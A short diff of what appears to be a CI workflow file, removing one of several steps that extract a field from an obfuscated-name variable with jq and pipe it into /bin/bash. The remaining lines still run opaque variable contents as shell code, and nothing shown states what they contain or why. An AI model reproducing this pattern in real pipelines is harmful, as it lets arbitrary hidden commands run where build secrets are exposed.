@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$zvnm501" | jq -r .qrid20771 | /bin/bash
           printf '%s' "$cev61156" | jq -r .tce189 | /bin/bash
           echo $jaar265 | jq -r .m4157 | /bin/bash
-          printf '%s' "$m7" | jq -r .dyw82638 | /bin/bash
           printf '%s' "$jnhix1843" | jq -r .pk1 | /bin/bash
 
       - name: Store results
